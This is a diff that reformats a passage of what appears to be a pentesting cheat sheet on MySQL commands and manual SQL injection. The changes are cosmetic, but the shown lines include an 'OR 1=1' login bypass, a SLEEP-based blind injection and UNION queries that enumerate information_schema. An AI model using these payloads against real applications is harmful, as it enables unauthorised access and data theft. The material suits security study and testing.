@@ -148,10 +148,10 @@ $ mysql -u <USERNAME> -h <RHOST> -p
 ### Basic Commands
 
 ```c
-mysql> show databases;
-mysql> use <DATABASE>;
-mysql> show tables;
-mysql> describe <TABLE>;
+mysql> SHOW databases;
+mysql> USE <DATABASE>;
+mysql> SHOW tables;
+mysql> DESCRIBE <TABLE>;
 mysql> SELECT * FROM Users;
 mysql> SELECT * FROM users \G;
 mysql> SELECT Username,Password FROM Users;
@@ -675,7 +675,7 @@ SELECT * FROM users WHERE username = 'admin' OR 1=1-- -' AND password = '<PASSWO
 
 ### Manual SQL Injection
 
-#### skel.sql
+#### Skeleton Payload
 
 ```c
 SELECT ? FROM ? WHERE ? LIKE '%amme%';    // control over amme
@@ -685,8 +685,8 @@ SELECT ? FROM ? WHERE ? LIKE '%hammer' AND 1 = SLEEP(2);-- %';    // blind sql i
 SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT 1,2,3 FROM dual);-- %';    // UNION sticks together two columns and put it out; output queries to the screen is super bad!
 ```
 
-JOIN = merging columns 1 by 1
-UNION = appending
+- JOIN = merging columns 1 by 1
+- UNION = appending
 
 ```c
 SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3) FROM information_schema.tables;-- %';    // information_schema.tables is an information table
